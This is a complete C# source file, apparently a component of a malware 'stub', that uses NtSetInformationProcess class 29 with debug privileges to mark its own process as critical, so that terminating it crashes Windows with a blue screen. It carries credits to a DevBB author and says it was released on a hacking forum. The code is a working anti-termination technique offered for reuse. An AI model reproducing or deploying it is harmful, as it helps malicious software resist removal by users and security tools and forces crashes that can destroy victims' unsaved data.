using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

/*
 * Title: CCritical.cs
 * Description: Makes a process critical. Terminating it will result in a BSoD.
 *
 * Developed by: affixiate from DevBB (http://devbb.org)
 * Release date: December 15, 2010
 * Released on: http://opensc.ws
 *
 * Comments: If you use this code, I require you to give me credits. Don't be a ripper! ;]
 */

/* @affixiate: I gave you credits. :D */

namespace ukp32_stub
{
    public class CCritical
    {
        /// <summary>
        /// Initializes a new instance of the <see cref="CCritical"/> class.
        /// </summary>
        public CCritical()
        {
            try
            {
                // Attempts to acquire debug privileges.
                Process.EnterDebugMode();
            }
            catch
            {
                throw new Exception ("Couldn't acqure debug privileges. This program must run under an Administrator account.");
            }
        }

        /// <summary>
        /// Makes our process critical. 
        /// Terminating it now will cause a BSoD.
        /// </summary>
        public void Enable()
        {
            AdjustCritical(1);
        }

        /// <summary>
        /// Removes the critical attribute from our process.
        /// Terminating it now will not cause a BSoD.
        /// </summary>
        public void Disable()
        {
            AdjustCritical(0);
        }

        /// <summary>
        /// Internal method: Adjusts whether our process is critical or not.
        /// </summary>
        /// <param name="enable"></param>
        private static void AdjustCritical(int enable)
        {
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref enable, sizeof(int));
        }

        #region WinAPI
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        #endregion
    }
}
